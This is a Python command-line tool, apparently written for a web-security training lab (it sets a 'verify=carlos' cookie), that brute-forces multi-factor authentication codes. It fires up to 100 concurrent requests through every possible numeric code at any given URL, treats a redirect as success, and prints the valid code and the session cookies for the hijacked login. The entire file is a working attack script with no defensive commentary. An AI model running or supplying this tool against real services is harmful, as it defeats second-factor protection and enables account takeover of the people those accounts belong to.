#!/usr/bin/env python3
import requests
import concurrent.futures
import time
from typing import Dict, List, Tuple, Optional
import sys
import argparse
from urllib.parse import urlparse, parse_qs

class MFABruteforcer:
    def __init__(self, url: str, session_cookie: str = None, max_workers: int = 100):
        self.url = url
        self.session_cookie = session_cookie
        self.max_workers = max_workers
        self.successful_codes = []
        self.session = requests.Session()
        
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': urlparse(url).scheme + '://' + urlparse(url).netloc,
            'Referer': url,
        }
        
        if session_cookie:
            self.session.cookies.set('session', session_cookie)
            self.session.cookies.set('verify', 'carlos')
    
    def try_mfa_code(self, code: str) -> Tuple[str, int, Optional[str]]:
        """Try a single MFA code and return (code, status_code, redirect_location)"""
        data = {
            'mfa-code': code
        }
        
        try:
            response = self.session.post(
                self.url,
                data=data,
                headers=self.headers,
                allow_redirects=False,
                timeout=5
            )
            
            redirect_location = None
            if response.status_code == 302:
                redirect_location = response.headers.get('Location', '')
                print(f"\n[!] SUCCESS - Found valid MFA code: {code}")
                print(f"[+] Status Code: {response.status_code}")
                print(f"[+] Redirect Location: {redirect_location}")
                
                # Build full redirect URL
                if redirect_location.startswith('/'):
                    parsed = urlparse(self.url)
                    full_redirect = f"{parsed.scheme}://{parsed.netloc}{redirect_location}"
                    print(f"[+] Full Redirect URL: {full_redirect}")
                else:
                    print(f"[+] Full Redirect URL: {redirect_location}")
                
                # Display cookies from response
                print(f"\n[+] Response Cookies:")
                for cookie in response.cookies:
                    print(f"    {cookie.name}={cookie.value}")
                
                # Display all cookies needed to access the redirect URL
                print(f"\n[+] All cookies for accessing redirect URL:")
                all_cookies = []
                for cookie in self.session.cookies:
                    all_cookies.append(f"{cookie.name}={cookie.value}")
                print(f"    Cookie: {'; '.join(all_cookies)}")
                
                self.successful_codes.append(code)
            
            return code, response.status_code, redirect_location
            
        except Exception as e:
            return code, 0, None
    
    def bruteforce(self, start: int = 0, end: int = 9999, digits: int = 4):
        """Bruteforce MFA codes from start to end"""
        print(f"[*] Starting MFA bruteforce attack on: {self.url}")
        print(f"[*] Testing {digits}-digit codes from {str(start).zfill(digits)} to {str(end).zfill(digits)}")
        print(f"[*] Using {self.max_workers} concurrent workers")
        
        codes = [str(i).zfill(digits) for i in range(start, end + 1)]
        total_codes = len(codes)
        
        start_time = time.time()
        completed = 0
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            future_to_code = {executor.submit(self.try_mfa_code, code): code for code in codes}
            
            for future in concurrent.futures.as_completed(future_to_code):
                code, status_code, redirect_location = future.result()
                completed += 1
                
                if completed % 100 == 0:
                    elapsed = time.time() - start_time
                    rate = completed / elapsed
                    remaining = (total_codes - completed) / rate
                    print(f"\r[*] Progress: {completed}/{total_codes} ({completed*100/total_codes:.1f}%) | "
                          f"Rate: {rate:.0f} codes/sec | ETA: {remaining:.0f}s", end='')
                
                if status_code == 302:
                    print(f"\n[!] Attack completed - Valid code found!")
                    executor.shutdown(wait=False)
                    break
        
        elapsed_time = time.time() - start_time
        print(f"\n\n[*] Attack completed in {elapsed_time:.2f} seconds")
        print(f"[*] Average rate: {total_codes/elapsed_time:.0f} codes/second")
        
        if self.successful_codes:
            print(f"\n[+] Successful MFA codes found: {', '.join(self.successful_codes)}")
        else:
            print("\n[-] No valid MFA codes found")
        
        return self.successful_codes

def main():
    parser = argparse.ArgumentParser(description='MFA Bruteforce Tool')
    parser.add_argument('url', help='Target URL for MFA submission')
    parser.add_argument('-s', '--session', help='Session cookie value', default=None)
    parser.add_argument('-w', '--workers', type=int, default=100, help='Number of concurrent workers (default: 100)')
    parser.add_argument('-d', '--digits', type=int, default=4, help='Number of digits in MFA code (default: 4)')
    parser.add_argument('--start', type=int, default=0, help='Starting code (default: 0)')
    parser.add_argument('--end', type=int, default=None, help='Ending code (default: all possible for digit length)')
    
    args = parser.parse_args()
    
    if args.end is None:
        args.end = (10 ** args.digits) - 1
    
    bruteforcer = MFABruteforcer(args.url, args.session, args.workers)
    bruteforcer.bruteforce(args.start, args.end, args.digits)

if __name__ == '__main__':
    main()